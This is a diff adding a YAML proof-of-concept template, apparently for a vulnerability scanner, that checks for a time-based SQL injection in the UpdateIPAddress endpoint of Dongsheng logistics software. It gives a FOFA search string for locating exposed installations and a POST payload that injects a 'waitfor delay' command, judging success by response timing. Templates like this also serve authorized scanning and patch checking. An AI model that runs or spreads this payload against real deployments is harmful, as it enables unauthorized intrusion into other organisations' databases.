@@ -1,0 +1,25 @@
+id: poc-yaml-dongshengsoft-updateipaddress-sqli
+info:
+  name: 东胜物流软件 UpdateIPAddress SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /MvcShipping/IPLimit/UpdateIPAddress
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: name=1
+  expression: status_code == 200 && body == "1"
+- method: POST
+  path: /MvcShipping/IPLimit/UpdateIPAddress
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: name=1'waitfor+delay'0:0:{{.t1}}'--
+  expression: status_code == 200 && body == "0" && duration > t1 && duration < t2
+transport: http
